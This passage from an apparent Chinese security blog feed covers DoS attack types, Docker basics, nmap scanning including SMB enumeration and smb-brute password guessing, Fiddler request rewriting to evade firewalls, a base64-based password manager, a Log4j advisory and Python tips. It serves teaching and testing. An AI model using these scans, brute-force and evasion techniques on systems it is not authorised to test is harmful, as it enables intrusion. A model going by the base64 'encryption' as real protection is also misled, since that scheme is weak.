Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\nContent-Length: 9999999999\r\n\r\n Slow Read attack Slow Read attack攻击方式是采用调整TCP协议中的滑动窗口大小，来对服务器单次发送发送的数据大小进行控制，使得服务器需要对一个回应分成很多个包来发送。 Server Limit Dos 这是由于cookie导致的dos攻击，当然其原理还是基于webserver的特性。apache默认最大的http包头长度为8192字节，如果超出此长度，则会返回4xx错误。如果我们利用存储型xss漏洞，将一个超长的cookie写入客户端页面，则用户再访问此页面后，由于请求头加载了恶意的超长cookie，导致其不能访问该站的页面（除非清空cookie） ReDos 这是由于代码写得有缺陷，导致使用正则时，会出现大量占用资源的情况，导致服务不可用，这是利用了正则表达式在匹配时的某些特性决定的。 应用层DDos防御 判断User-Agent字段（不可靠，因为可以随意构造） 网页中镶嵌js代码（不可靠，因为爬虫也可携带浏览器引擎，或者执行js代码） 针对ip+cookie，限制访问频率（由于cookie可以更改，ip可以使用代理，或者肉鸡，也不可靠) 关闭apache最大连接数等，合理配置中间件，缓解ddos攻击。 页面中添加验证码，比如搜索数据库时。 编写代码时，尽量实现优化，并合理使用缓存技术，减少数据库的读取操作。 应用层的防御有时比网络层的更难，因为导致应用层被dos攻击的因素非常多，有时往往是因为程序员的失误，导致某个页面加载需要消耗大量资源，有时是因为中间件配置不当等等。而应用层DDos防御的核心就是区分人与机器（爬虫），因为大量的请求不可能是人为的，肯定是机器构造的。因此如果能有效的区分人与爬虫行为，则可以很好地防御此攻击。 无线DDOS@更新于2017年5月31日参考：http://www.freebuf.com/articles/wireless/135598.html Auth Flood攻击Auth Flood攻击：即身份验证洪水攻击。该攻击目标主要针对那些处于通过验证、和AP建立关联的关联客户端，攻击者将向AP发送大量伪造的身份验证请求帧（伪造的身份验证服务和状态代码），当收到大量伪造的身份验证请求超过所能承受的能力时，AP将断开其他无线服务连接。 Deauth Flood攻击Deauth Flood攻击即为取消验证洪水攻击，它旨在通过欺骗从AP到客户端单播地址的取消身份验证帧来将客户端转为未关联/未认证的状态。对于目前的工具来说，这种形式的攻击在打断客户无线服务方面非常有效和快捷。一般来说，在攻击者发送另一个取消身份验证帧之前，客户端会重新关联和认证以再次获取服务。攻击者反复欺骗取消身份验证帧才能使所有客户端持续拒绝服务。 Association Flood攻击Association Flood攻击即为关联洪水攻击。在无线路由器或者接入点内置一个列表即为连接状态表，里面可显示出所有与该AP建立连接的无线客户端状态。它试图通过利用大量模仿和伪造的无线客户端关联来填充AP的客户端关联表，从而达到淹没AP的目的。由于开放身份验证（空身份验证）允许任何客户端通过身份验证后关联。利用这种漏洞的攻击者可以通过创建多个到达已连接或已关联的客户端来模仿很多客户端，从而淹没目标AP的客户端关联表。 Disassociation Flood攻击Disassociation Flood攻击即为取消关联洪水攻击，和deauthenticaiton flood攻击表现方式很相似。它通过欺骗从AP到客户端的取消关联帧来强制客户端成为未关联/未认证的状态。一般来说，在攻击者发送另一个取消关联帧之前，客户端会重新关联以再次获取服务。攻击者反复欺骗取消关联帧才能使客户端持续拒绝服务。Disassociation Broadcast攻击和Disassociation Flood攻击原理基本一致，只是在发送程度及使用工具上有所区别，前者很多时候用于配合进行无线中间人攻击，而后者常用于目标确定的点对点无线DOS，比如破坏或干扰指定机构或部门的无线接入点等。 RF Jamming攻击RF Jamming攻击即为RF干扰攻击。该攻击是通过发出干扰射频达到破坏正常无线通信的目的。而前面几种攻击主要是基于无线通信过程及协议的。RF为射频，主要包括无线信号发射机及收信机等。]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>DDos</tag>
        <tag>网络安全</tag>
        <tag>拒绝服务</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker基础总结]]></title>
    <url>../../../../../../../../2017/05/04/1/</url>
    <content type="text"><![CDATA[人生如戏，而你是若不是演员？ 最近玩了玩Docker，感觉还不错，在此记录分享下docker的一些基础用法。本篇内容会随着本人对docker的不断地深入研究使用而补充，也欢迎大家纠错。 Docker的优点这里不再细说，docker的用途非常广，我最近准备使用它搭建测试环境（漏洞测试环境、开发测试环境等），还可以用来部署分布式项目（可以极大程度得利用服务器资源），当然docker的用途还有很多，这里不再详述。 docker 介绍 docker客户端与服务器（守护进程） docker镜像（image) registry docker容器(container) docker容器是构建在镜像之上的，我们可以将image理解为定义好的类，而container便是实例，一个类可以实例化出很多实例，同样docker也可以在镜像上运行多个容器，每个容器可以是一样的，也可以是定制化的。docker客户端与服务器可以运行在同一台宿主机上，也可以不同。 registry用于保存用户的镜像，它分为公有与私有。docker公司运营的公共registry叫做docker hub,用户可以在docker hub上注册账号，分享并保存自己的镜像。 docker installdocker可以运行在linux、mac、windows上。 install docker for mac前往官网下载安装包：https://www.docker.com/products/docker#/mac下载完以后直接安装，安装完成后运行docker run hello-world，如果没有报错，说明安装成功。更换镜像源（填写国内的镜像源）： install docker for linux安装dokcer:1sudo yum -y install docker-io 启动docker守护进程：12sudo service docker enable(start)sudo /etc/init.d/docker start 开机自启动：1sudo systemctl start(enable) docker 更换国内镜像推荐使用阿里云镜像，地址:http://dev.aliyun.com/search.html注册一个账号登录后，进入控制台加速器，会得到一个镜像地址，将该地址添加到/etc/default/docker文件，重启docker服务即可。 docker 基础命令 docker基础命令包含docker操作、镜像操作、容器操作以及其他相关操作，以下列举了一些常用的命令，更多请参考官方文档，或者使用–help命令查看。 docker操作查看docker信息12345678$docker infoContainers: 1 #1个容器 Running: 1 #1个容器正在运行 Paused: 0 Stopped: 0Images: 5 #5个镜像Server Version: 1.12.3...... 查看docker版本123456789101112131415161718$docker -vDocker version 1.12.3, build 6b644ec$docker versionClient: Version: 1.12.3 API version: 1.24 Go version: go1.6.3 Git commit: 6b644ec Built: Wed Oct 26 23:26:11 2016 OS/Arch: darwin/amd64Server: Version: 1.12.3 API version: 1.24 Go version: go1.6.3 Git commit: 6b644ec Built: Wed Oct 26 23:26:11 2016 OS/Arch: linux/amd64 镜像操作本地镜像都保存在/var/lib/docker目录下。查看本地镜像列表:1docker images -a #-a可以查看所有的image 其他镜像操作：123456789docker search (image-name) 查询镜像 example：docker search ubuntudocker history (image-name) 查看镜像的历史版本docker push (image-name) 将镜像推送到registrydocker pull image-name:tag pull镜像 example:docker pull ubuntu:latestdocker rmi &lt;image id&gt; 删除镜像（先stop并删除镜像上的所有容器）docker rmi $(docker images -q) 删除全部镜像docker tag image-id imagename:tag 修改镜像的tag标签docker load -i test.tar 从tar文件中载入镜像docker save image &gt; test.tar 保存镜像为tar文件 容器操作创建容器：1docker run --rm -ti ubuntu /bin/bash –rm 一旦进程退出，则删除容器 -ti 进入交互模式 ubuntu 容器立足的镜像名字 /bin/bash 要运行的命令 1docker run -d -p 8000:80 --name test image-name -d 后台运行 -p 映射的端口,:前为本机，后为容器 –name 自定义名称 注意：创建容器以后， 会返回一个ID，是随机生成的。 检查容器运行状态：1docker ps -a（显示所有容器，包括已经stop的） 查看容器具体信息：1docker inspect 容器id(容器名) 比ps -a命令更详细，包含网络信息、配置信息等内容，可以用-forma匹配出来，如：1sudo docker inspect --format '&#123;&#123; .NetworkSettings.IPAddress &#125;&#125;' c18acd6a8a32 #查看容器ip地址 查看容器内进程：1docker top 容器id 进入容器内部：1sudo docker attach 容器id 或者可以使用：1docker exec -ti 容器name /bin/bash exec命令可以在容器内部执行命令，以上代码表示在容器内新建一个shell。 退出容器：1[rootq3e1]exit 重启容器：1docker run —restart=always restart参数可以设置以下内容： always 无论容器内退出什么代码程序，都会重启docker容器 on-failure 可以指定退出代码 更多容器操作：12345678910111213docker attach container 进入容器交互式界面docker diff container 列出容器内发生变化的文件与目录dcoker logs ID(容器的ID，可以用docker ps查看) 查看docker上的容器的状态docker stop ID(或者容器名字) 关闭运行中的容器docker start ID 开启容器docker restart ID 重启运行中的容器docker stop ID docker rm ID 移除容器（先关闭再删除）docker kill [options] container 杀死容器的主进程docker stop $(docker ps -a -q) 停止所有containerdocker rm $(docker ps -a -q) 移除所有containerdocker commit ID new镜像名字（只能字母加数字） 将容器的状态保存为镜像docker export container &gt; test.tar 将容器打包成tar文件docker cp container:path hostpath 从容器内复制文件到指定的路径 容器网络管理：（感谢@DarkEvil补充分享） host模式，使用dockerrun时使用–net=host指定（docker使用的网络实际上和宿主机一样，在容器内看到的网卡ip是宿主机上的ip） container模式，使用–net=container:container_id/container_name（多个容器使用共同的网络，看到的ip是一样的） none模式，使用–net=none指定（这种模式下，不会配置任何网络） bridge模式，使用–net=bridge指定 默认模式，不用指定默认就是这种网络模式。（这种模式会为每个容器分配一个独立的Network Namespace。类似于vmware的nat网络模式。同一个宿主机上的所有容器会在同一个网段下，相互之间是可以通信的。） other操作1234docker import http://example.com/example.tar 远程导入文件docker login [options][server] 用来登陆自己的registrydocker inspect container/image 收集容器的信息（ip地址，端口等）docker wait container 阻塞 dockerfile dockerfile可以用来动态生成新的镜像，比如说我们pull了一个基础的centos镜像，现在需要在此镜像内安装一些软件，以便可以顺利运行我们准备的项目代码，那么可以使用以下2种方案： 方案一：（手动式） 在centos镜像上创建一个容器，进入容器交互式界面后，手动安装一些需要的软件，配置好环境。当做好所有的修改后，使用docker commit container-id newimagename创建新的镜像。再使用新的镜像来创建容器，运行我们的项目代码。 方案二：（自动式） 所谓自动化，就是不需要进入容器手动输入命令进行配置，一切都在容器运行时自动处理，那么这就要用到dockerfile了。dockerfile简单来说就是一个配置文件，docker容器在运行时会处理这个文件内容，比如安装软件，修改环境变量，运行程序等。使用dockerfile的好处在于可以很方便的修改配置文件内容，达到创建动态镜像的效果。 创建dockerfile 我们需要创建一个目录来存放Dockerfile文件，目录名称可以任意取，在该目录里创建Dockerfile文件。这里我以创建一个基于centos基础镜像，容器运行后会自动开启一个python webserver（本地监听8080端口）的例子。 编写dockerfile在Dockerfile文件内写入：123456789# Version 0.1# 基础镜像FROM centos:latest# 维护者信息MAINTAINER http://thief.one# 镜像操作命令RUN yum install wget# 容器启动命令CMD python -m SimpleHTTPServer 8080 dockerfile语法类似于MakeDown，基础内容如下： FROM 基于的基础镜像名称 MAINTAINER 维护者信息 RUN 运行的命令（安装软件等） CMD 启动容器时运行的命令（只能写一条） 语法不止这些，更多内容，可以参考官方文档。 生成dockerfile镜像进入到Dockerfile文件所在目录，运行：123docker build -t centos_test:01 .或者docker build -t centos_test:01 git@github:......(远程git地址) 此时，运行docker images -a查看，会发现多了一个image，名称为centos_test，tag为01如果dockerfile写得有问题，在build时会报错，这时可以通过docker run 容器id 进入最后状态的容器去调试。 使用dockerfile镜像在此image上运行容器：1docker run -d -p 80:8080 centos_test:0.1 此时，打开本机的127.0.0.1:80 dockerfile规则每条指令都必须为大写字母，如FROM、RUN，且后面要跟一个内容，docker file会按从上往下的顺序执行这些内容。 WORKDIR作用：设置工作目录，类似cd1234WORKDIR /root/RUN apt-get install pipWORKDIR /root/test...... 可以使用-w参数覆盖容器工作目录1docker run -w /root/nmasktools ...... ENV作用：设置容器内的环境变量可以用-e来覆盖。 USER作用：指定以什么样的用户去运行容器1USER nmask（用户名或者id） 可以使用 docker -u 来覆盖。 ADD、COPYadd与copy都是用来向镜像中添加文件的，区别在于copy只能复制文件，而没有解压功能。 docker的内容非常多，以上只是一些最基础的用法，本文也将会持续更新]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【渗透神器系列】nmap]]></title>
    <url>../../../../../../../../2017/05/02/1/</url>
    <content type="text"><![CDATA[这个世界好比一座大熔炉，烧炼出一批又一批品质不同而且和原先的品质也不相同的灵魂 本篇作为渗透神器系列第三篇，将介绍一款经典的端口扫描工具–nmap。目前市面上成熟的端口扫描器有很多，比如massscan(全网扫描器)，zenmap(nmap的GUI版)等，但我个人还是钟爱nmap，原因很简单，因为它很强大，并且支持扩展。Nmap最新几个版本中，加入了nmap script Engine(NSE)功能，支持扩展脚本，即可以在nmap中加载自定义的nse脚本，以达到扫描的目的。目前官方的nse脚本已达500多个，nse脚本地址https://nmap.org/nsedoc/，或者查看github库。 本篇将会介绍如何编写以及使用nse脚本，以便能最大程度地发挥出nmap的强大功能（扩展功能），当然本文后本段也会简单介绍下nmap工具的基本使用方法以及参数设置。 NSE nse全称是nmap脚本引擎，脚本后缀名为.nse，脚本用Lua语言编写，遵循特定的规则。nse脚本存放在nmap安装目录下的scripts目录下，目前官方提供的大概有500多个，功能涵盖了常用的漏洞检测、端口检测、基线检测等。 nse script exploit在scripts目录下新建一个文件，如：hello.nse，写入以下内容：123456789-- The Head Section ---- The Rule Section --portrule = function(host, port)return port.protocol == "tcp" and port.number == 80 and port.state == "open"end-- The Action Section --action = function(host, port)return "Hello world"end 以上代码运行后，会检测目标ip是否开放了80端口，若开放则返回helloworld。nse脚本遵循nmap api规范，其包含三部分内容，其中–开头的行为注释内容。 The Head Section该部分包含一些元数据，主要描述脚本的功能，作者，影响力，类别及其他。 The Rule Section该部分定义脚本的一些规则，至少包含下面列表中的一个函数： portrule hostrule prerule postrule The Action Section该部分定义脚本逻辑，即满足条件后执行的内容，比如上面例子为输出helloworld。 调用内置库NSE脚本可以调用内置库，比如http库、shortport库、nmap库等。导入方式：123local http = require "http"local nmap = require "nmap"local shortport = require "shortport" 更多nse-api参考：https://nmap.org/book/nse-api.html更多lua语法参考：http://www.runoob.com/lua/lua-tutorial.html nse script usage当在scripts下面编写完hello.nse脚本后，如何加载使用呢？方法一：12nmap --script-updatedb 更新脚本库nmap --script=hello 使用该脚本 方法二：1nmap --script=d:/..../hello.nse 绝对路径 其他参数：1234567-sC: 等价于–script=default，使用默认类别的脚本进行扫描 可更换其他类别–script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt;使用某个或某类脚本进行扫描，支持通配符描述–script-args=&lt;n1=v1,[n2=v2,...]&gt;: 为脚本提供默认参数–script-args-file=filename: 使用文件来为脚本提供参数–script-trace: 显示脚本执行过程中发送与接收的数据–script-updatedb: 更新脚本数据库–script-help=&lt;scripts&gt;: 显示脚本的帮助信息，其中&lt;scripts&gt;部分可以逗号分隔的文件或脚本类别 nse example对目标机器进行扫描,同时对smb的用户进行枚举。1nmap --script=smb-enum-users target_ip 对目标机器所开启的smb共享进行枚举。1nmap --script=smb-enum-shares target_ip 对目标机器的用户名和密码进行暴力猜测。1nmap --script=smb-brute target_ip 对目标机器测试心脏滴血漏洞。1nmap -sV --script=ssl-heartbleed target_ip 再举几个硬件设备的例子：1234567modbus-discover.nse （该脚本可以调用Modbus 43（2B功能码）功能码读取设备信息）modbus-enum.nse （Modbus TCP设备枚举脚本）s7-enumerate.nse （西门子S7 PLC设备发现脚本，可以枚举PLC的一些基本信息）enip-enumerate.nse （可以读取EtherNet/IP设备的基本信息）BACnet-discover-enumerate.nse （可以读取BACnet设备的基本信息）iec-identify.nse （IEC104协议asdu address枚举脚本）mms-identify.nse （IEC-61850-8-1协议信息枚举脚本） nmap introduce以上内容为nmap nse扩展脚本的基础知识，其中涉及到nse脚本编写的语法规则等，本篇暂不做详细介绍，可参考官方文档。以下内容为nmap基础使用，包含命令行参数等内容。 nmap parameternmap参数：1234567891011121314151617181920212223242526272829303132333435363738nmap [Scan Type(s)] [Options] &#123;target specification&#125;scan type(s) 用于指定扫描类型options 用于指定选项target specification 用于指定扫描目标-s 指定扫描类型如下：-sP (ping扫描) *存活主机探测-sS (TCP SYN扫描 隐身扫描) *默认扫描方式-sT (tcp 扫描) * syn 不能用时就tcp扫描-sU （UDP 扫描）-sA （ACK扫描） *三次握手 用于探测出防火墙过滤端口 实际渗透中没多大用-sV （版本探测）-A 操作系统探测-O （启用操作系统检测）-v 详细选项说明-P0 [指定端口] (无ping扫描)-PU [指定端口] (udp ping扫描)-PS [指定端口] (TCP SYN ping 扫描)-PA [指定端口] (tcp ack ping扫描) -PI 使用真正的pingICMP echo请求来扫描目标主机是否正在运行-iL 指定扫描主机列表-iR 随机选择目标--exclude 排除扫描目标--excludefile 排除文件中目标列表-n (不用域名解析)-R (为所有目标解析域名)-T 时间优化（每隔多久发一次包 ） -T5 最快 -T0 最慢-F 快速扫描-e 指定网络接口-M 设置tcp扫描线程 nmap output输出结果：12345-oS 保存扫描结果输出-oN 把扫描结果重定向到一个可读的文件logfilename中-oM 每个结果一行输出-oA 同上--append-output 附在原来的结果前面 nmap statusnmap端口状态：123456open（开放的）closed（关闭的）filtered（被过滤的）不确定开放还是关闭unfiltered （未被过滤的）openfiltered （开放或者被过滤的）closedfiltered （关闭或者未被过滤的) nmap常用命令以下命令部分收集于网络，部分来自个人总结。轻量级扫描：1234567nmap -sP 192.168.0.0/24 判断哪些主机存活nmap -sT 192.168.0.3 开放了哪些端口nmap -sS 192.168.0.127 开放了哪些端口（隐蔽扫描）nmap -sU 192.168.0.127 开放了哪些端口（UDP）nmap -sS -O 192.168.0.127 操作系统识别nmap -sT -p 80 -oG – 192.168.1.* | grep open 列出开放了指定端口的主机列表nmap -sV -p 80 thief.one 列出服务器类型(列出操作系统，开发端口，服务器类型,网站脚本类型等) 批量扫描：1nmap -sT -sV -O -P0 --open -n -oN result.txt -p80-89,8080-8099,8000-8009,7001-7009,9000-9099,21,443,873,2601,2604,3128,4440,6082,6379,8888,3389,9200,11211,27017,28017,389,8443,4848,8649,995,9440,9871,2222,2082,3311,18100,9956,1433,3306,1900,49705,50030,7778,5432,7080,5900,50070,5000,5560,10000 -iL ip.txt 批量扫描：1nmap -sT -sV -p80-89,8080-8099,8000-8009,7001-7009,9000-9099,21,443,873,2601,2604,3128,4440,6082,6379,8888,3389,9200,11211,27017,28017,389,8443,4848,8649,995,9440,9871,2222,2082,3311,18100,9956,1433,3306,1900,49705,50030,7778,5432,7080,5900,50070,5000,5560,10000 --open --max-hostgroup 10 --max-parallelism 10 --max-rtt-timeout 1000ms --host-timeout 800s --max-scan-delay 2000ms -iL ~/Desktop/ip.txt -oN ~/Desktop/result/result.txt nmap apinmap支持很多语言的扩展，本文简单介绍下python中如何使用nmap。 python-nmap安装：pip install python-nmap作用：利用python调用nmap接口，实现端口扫描。使用：1234&gt;&gt;&gt; import nmap&gt;&gt;&gt; nm = nmap.PortScanner()&gt;&gt;&gt; nm.scan('127.0.0.1', '22-443')&gt;&gt;&gt; nm.command_line() 更多使用方法，参考：http://xael.org/pages/python-nmap-en.html 传送门【渗透神器系列】Metasploit【渗透神器系列】DNS信息查询【渗透神器系列】nc【渗透神器系列】Fiddler【渗透神器系列】搜索引擎【渗透神器系列】WireShark]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>渗透神器</tag>
        <tag>nmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【渗透神器系列】Fiddler]]></title>
    <url>../../../../../../../../2017/04/27/1/</url>
    <content type="text"><![CDATA[人世起起落落 左手边上演的华灯初上 右手边是繁华落幕的星点余光 本篇作为渗透神器系列第二篇，将介绍一款渗透界web测试开发界比较流行的一款web流量抓包分析工具，Fiddler。Fiddler的功能这里不多说，简单概括就是抓包、改包、重放。本篇的重点不是介绍Fiddler的基础用法，而是介绍如何通过编程打造属于自己的定制化Fiddler。本篇所记内容大部分来自互联网，如觉内容老套可自行绕道，全当个人查询之用，轻喷即可。 修改规则文件CustomRules.jsCustomRules.js是用Jscript.NET语言写的，语法类似C#。通过修改CustomRules.js可以修改http的请求和应答，不用中断程序，还可以针对不同的url做特殊的处理。 CustomRules.js文件位置Fiddler工具菜单栏：1rules-&gt;CustomRules 本地电脑磁盘存放地址：1C:\Documents and Settings\[your user]\MyDocuments\Fiddler2\Scripts\CustomRules.js 常用内容先分享一个常用的内容：1234567891011121314151617static function OnBeforeRequest(oSession: Session) &#123; // oSession.oRequest.headers.Remove("Cookie"); //移除请求包的cookies // oSession.oRequest.headers.Add("Cookie", "username=admin;"); //新建cookies // oSession.oRequest["Referer"]="http://www.baidu.com"; //设置referer为baidu // if (oSession.HTTPMethodIs("POST"))&#123; //POST修改为GET // oSession.RequestMethod="GET"; // &#125; // var strBody=oSession.GetRequestBodyAsString(); //获取请求包中的body内容，修改其内容。 // // // strBody=strBody.replace("111","222"); //替换字符串 // strBody="11111111111111111111111111111111111"+strBody; //在发送的数据包前面加上垃圾数据 // // // strBody=strBody.ToUpper(); //全部转化为大写 // // // strBody=strBody.ToLower(); //全部转化为小写 // oSession.utilSetRequestBody(strBody);&#125; 如上所示，修改OnBeforeRequest函数下的代码，可以起到在发送请求之前，自动修改请求包中的一些参数。如可以增删改cookie，headers头参数，可以修改请求包类型等，主要作用就是为了达到渗透测试时某种特殊的作用，比如绕过防火墙。 常用函数http请求函数：即修改该函数内容，可以在发送http请求包之前修改某些参数。1static function OnBeforeRequest(oSession: Session) http应答函数：即修改该函数内容，可以在接收http应答包之前修改某些参数1static function OnBeforeResponse(oSession: Session) 函数中的方法属性筛选某个url1if (oSession.host.indexOf("thief.one") &gt; -1) &#123;&#125; 修改session中的显示样式1oSession["ui-color"] = "orange"; #即该记录显示的颜色 移除http头部中的某字段1oSession.oRequest.headers.Remove(""); 修改http头部中的某字段内容1oSession.oRequest["Referer"] = "http://thief.one"; 修改host1oSession.host = "thief.one"; 修改Origin字段1oSession.oRequest["Origin"] = "http://thief.one"; 删除所有的cookie1oSession.oRequest.headers.Remove("Cookie"); 新建cookie1oSession.oRequest.headers.Add("Cookie", "username=nMask;"); 获取Request中的body字符串1var strBody=oSession.GetRequestBodyAsString(); 用正则表达式或者replace方法去修改string1strBody=strBody.replace("thief","nmask"); 弹个对话框检查下修改后的body1FiddlerObject.alert(strBody); 将修改后的body，重新写回Request中1oSession.utilSetRequestBody(strBody); 修改请求url例如：将请求URI中http协议替换成https协议。1oSession.fullUrl = "https" + oSession.fullUrl.Substring(oSession.fullUrl.IndexOf(':')); 网络限速1000/下载速度 = 需要delay的时间(毫秒)，比如20kB/s 需要delay50毫秒来接收数据。123456if (m_SimulateModem) &#123; // Delay sends by 300ms per KB uploaded. oSession["request-trickle-delay"] = "300"; // Delay receives by 150ms per KB downloaded. oSession["response-trickle-delay"] = "150"; &#125; Fiddler可以定制化很多功能，以上是我平时常用的一些内容，如想要了解更多用法请参考官方文档：Fiddler文档 传送门【渗透神器系列】Metasploit【渗透神器系列】DNS信息查询【渗透神器系列】nc【渗透神器系列】nmap【渗透神器系列】搜索引擎【渗透神器系列】WireShark 参考：http://www.open-open.com/lib/view/open1429059806736.html]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>渗透神器</tag>
        <tag>Fiddler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PwdManage密码管理工具]]></title>
    <url>../../../../../../../../2017/04/24/1/</url>
    <content type="text"><![CDATA[信任的丢失，才是末日的开始 随着越来越多的网络服务商（主要是网站）被曝数据泄露，本人开始有点小担心了。因为我每个网站的账号密码几乎一样，一旦有一个网站被泄露，那就gg了。于是乎，趁着周末空闲，我开发了一个小工具，用于管理密码。 网上类似于这样的工具（插件）非常多，我不想去比较，因为别人写得再好，我也不可能完全信任，因此只能自己动手写了。（人与人之间的信任呢？）此工具仅限自己把玩，如有使用此工具导致信息泄露，概不负责 设计思路首先作为一个密码管理工具，得有3个最基础的功能，密码生成、密码存储以及密码查询。 密码生成原本想借助于AES算法的，但是实际编写过程中出了点状况，因此改用base64（进过特殊处理）。当然用来加密明文密码不可能只用简单的base64，其中经过多次复杂的转换，并且生成的密码存在一定随机性，不易发现规律。 密码存储原本是想搞个数据库用来存储密码，但后来发现不够简便，于是用了最简单的文件存储，并借助了git库，将文件同步到远程git仓库中。 密码查询这个很好实现，从文件中读取密文内容，通过算法解密，然后输出。 项目介绍 config_init存储配置文件，进入程序密码、git仓库地址 pwdmanagedb/pwd.db存储密文密码 pwdmanage.py项目程序代码 说明：存储到文件的内容都进过特殊的加密，一般没有pwdmanage.py是无法解密其中的内容的。pwd.db存储在git项目中，每次运行程序时都会向远处仓库pull最新内容，每次本地新增一个用户也会立即同步推送到远处仓库中。 Usage更新启动密码1python pwdmanage.py --upwd 123456 修改当前密码为123456,需要输入老密码。 更新git库地址1python pwdmanage.py --gitaddress "./pwdmanagedb" 修改本地git项目文件路径为./pwdmanagedb，需要输入密码。 开启git远程同步功能1python pwdmanage.py --gitswitch True 默认为关闭的，即密码文件存储在本地，不会同步到远程git库中。 生成新密码输入注册账号的网站url，以及用户名，即可生成密码。密码分为明文与密文，密文将会存储到pwd.db文件内，并同步到指定的git仓库中。 查询密码输入url（支持模糊查询），可以查询出该url下注册的用户名与密码。 列举账户下所有的密码1python pwdmanage.py --l 列举出所有网站的账号密码。 删除密码1[-pwdmanage-]&gt;&gt; www.baidu.com nmask --delete 将百度网址的nmask账号删除。 手动设置密码1[-pwdmanage-]&gt;&gt; www.baidu.com nmask 123456 --set 将百度网址的用户名为nmask的密码设置为123456。 文件存储内容都是经过特殊处理后的base64密文。 后记 其实这个项目的关键点就在于密码生成的密文是否可能被解密，我想说可能性还是有的，比如说拿到了项目程序，恰巧破解了config.init中写的程序开启密码，并利用程序中内置的函数去解密。在实际使用时，会将py程序打包成可执行程序，避免源码泄露导致加密算法流出，当然通过反编译依然可以拿到源码。因此为了尽可能避免此事件，我的做法是将pwd.db文件与pwdmanage.py分离开，即退出程序后，将pwd.db文件删除，由于此文件是存在远端仓库中的，因此不用担心会丢失。而当别有用心之人拿到pwdmanage.py程序后，还必须知道远程项目地址密码，方可下载pwd.db并破解其中的密码。 最后再补充一句，即使以上步骤都被攻破了，那也没关系，反正银行卡密码都在脑中，对了，还有caoliu密码。 补充说明该工具目前只供自己把玩，主要原因在于功能还不完善，容易泄露密码，不敢轻易放出，待我研究研究。]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>安全工具</tag>
        <tag>密码管理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Apache Log4j反序列化漏洞(CVE-2017-5645)]]></title>
    <url>../../../../../../../../2017/04/19/2/</url>
    <content type="text"><![CDATA[生生的两端，我们彼此站成了岸 4月18日，Apache Log4j 被曝出存在一个反序列化漏洞(CVE-2017-5645)，攻击者可以通过发送一个特别制作的2进制payload，在组件将字节反序列化为对象时，触发并执行构造的payload代码。 漏洞触发点 该漏洞主要是由于在处理ObjectInputStream时，接收器对于不可靠来源的input没有过滤。可以通过给TcpSocketServer和UdpSocketServer添加可配置的过滤功能以及一些相关设置，可以有效的解决该漏洞。目前Log4j官方已经发布新版本修复了该漏洞，补丁参考下载地址：http://download.nextag.com/apache/logging/log4j/2.8.2/ 影响范围受影响的版本所有Apache Log4j 2.*系列版本： Apache Log4j 2.0-alpha1 – Apache Log4j 2.8.1 不受影响的版本Apache Log4j 2.8.2 Poc暂无 建议方案使用Java 7+的用户应立即升级至2.8.2版本或者避免使用socket server的相关类。参考链接：https://issues.apache.org/jira/browse/LOG4J2/fixforversion/12339750/?spm=5176.bbsr313258.0.0.sd9F87&amp;selectedTab=com.atlassian.jira.jira-projects-plugin:version-summary-panel使用Java 6的用户应该避免使用TCP或者UDP 的socket server相关类，用户也可以手动添加2.8.2版本更新的相关代码来解决该漏洞。参考链接：https://git-wip-us.apache.org/repos/asf?p=logging-log4j2.git;h=5dcc192 文章参考：http://toutiao.secjia.com/apache-log4j-deserialization-vulnerabilities-cve-2017-5645]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>Apache漏洞</tag>
        <tag>反序列化漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python奇技淫巧]]></title>
    <url>../../../../../../../../2017/04/19/1/</url>
    <content type="text"><![CDATA[叶落下了思念，风摇曳那些岁岁年年 本文用作记录，在使用python过程中遇到的一些奇技淫巧，有些代码是本人所写，有些则是python内置函数，有些则取之互联网。在此记录，只为备份以及遗忘时方便查找。 本文将会持续更新，内容仅限记录一些常用好用却又永远记不住的代码或者模块。 控制台操作控制台不闪退1os.system('pause') 获取控制台大小1rows, columns = os.popen('stty size', 'r').read().split() 输入输出控制解决输入提示中文乱码问题1raw_input(unicode('请输入文字','utf-8').encode('gbk')) 格式化输出1print a.prettify() 接受多行输入123456789101112131415text=""while 1: data=raw_input("&gt;&gt;") if data.strip()=="stop": break text+="%s\n" % dataprint text---------------------------&gt;&gt;1&gt;&gt;2&gt;&gt;3&gt;&gt;stop123 同行输出12Print '%s' % a,Print '%s \r' % a 标准输入输出12sys.stdout.write("input") 标准输入sys.stdout.flush() 刷新缓冲区 print的功能与sys.stdout.write类似，因为2.x中print默认就是将输出指定到标准输出中（sys.stdout)。 颜色控制控制台颜色控制(适用于windows)1234WConio.textcolor(WConio.YELLOW)print "yellow"WConio.textcolor(WConio.BLUE)print "blue" 输出颜色控制(全平台)12345678red = '\033[1;31m'green = '\033[1;32m'yellow = '\033[1;33m'white = '\033[1;37m'reset = '\033[0m’print red+"color is red"+resetprint green+"color is green"+reset 进度条控制方案一12345678from __future__ import divisionimport sys,timej = '#'for i in range(1,61): j += '#' sys.stdout.write(str(int((i/60)*100))+'% ||'+j+'-&gt;'+"\r") sys.stdout.flush() time.sleep(0.1) 方案二123456import sysimport timefor i in range(1,61): sys.stdout.write('#'+'-&gt;'+"\b\b") sys.stdout.flush() time.sleep(0.5) 方案三12345678910111213141516171819202122232425from progressbar import *import timeimport osrows, columns = os.popen('stty size', 'r').read().split() #获取控制台size console_width=int(columns)total = 10progress = ProgressBar()def test(): ''' 进度条函数，记录进度 ''' for i in progress(range(total)): test2()def test2(): ''' 执行函数，输出结果 ''' content="nMask'Blog is http://thief.one" sys.stdout.write("\r"+content+" "*(console_width-len(content))) time.sleep(1) sys.stdout.flush()test() 更多高级用法可以使用progressbar模块。 